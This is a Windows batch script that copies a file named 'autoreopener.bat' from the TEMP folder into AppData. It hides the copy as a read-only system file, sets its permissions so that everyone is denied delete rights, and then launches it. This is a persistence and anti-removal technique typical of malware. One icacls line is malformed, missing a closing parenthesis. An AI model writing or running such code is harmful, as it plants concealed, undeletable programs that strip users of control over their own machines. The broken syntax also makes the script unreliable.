@echo off
set "src=%TEMP%\autoreopener.bat"
set "src1=%TEMP%\autoreopener1.bat"
set "junction=%USERPROFILE%\AppData"
set "roaming=%APPDATA%"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%junction%\autoreopener.bat" /Y
attrib +h +s +r "%junction%\autoreopener.bat"
icacls "%junction%\autoreopener.bat" /inheritance:d
icacls "%junction%\autoreopener.bat" /grant:r *S-1-1-0:(RX)
icacls "%junction%\autoreopener.bat" /deny *S-1-1-0:(D
if %ERRORLEVEL%==0 (
    echo File copied successfully.
) else (
    echo Copy failed. Check permissions.
)

start "" "%junction%\autoreopener.bat"
